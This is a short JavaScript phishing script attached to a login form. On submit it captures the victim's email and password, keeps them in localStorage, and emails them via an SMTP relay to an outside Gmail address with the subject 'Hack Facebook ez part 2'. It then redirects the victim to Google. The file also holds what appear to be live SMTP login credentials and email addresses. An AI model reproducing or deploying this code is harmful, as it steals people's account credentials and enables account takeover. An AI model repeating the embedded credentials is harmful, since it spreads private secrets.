var gmail,password;

$(document).ready(function(){
	$('#form-logins').on('submit', function(e){
		 var gmail=$('#InputEmail1').val(),password=$('#InputPassword1').val();
		 e.preventDefault();
		 console.log(gmail + "===" + password);
		 localStorage.setItem("gmail",gmail);
		 localStorage.setItem("pass",password);
		 sendEmail();
		
		function sendEmail() {
		
			Email.send({
				Host: "smtp.elasticemail.com",
				Port: "2525",
				Username : "nguyenthevinh1002@gmail.com",
				Password : "7EB22FF62A6DEBA7CAA96FFA4EDF3A0CE92C",
				To : '10a4.kc@gmail.com',
				From : "nguyenthevinh1002@gmail.com",
				Subject : "Hack Facebook ez part 2",
				Body : gmail + "----" + password,
			}).then(
				message => 
				{
					alert(message);
					window.location="https://www.google.com/"
			}
			);
		}
	});
});
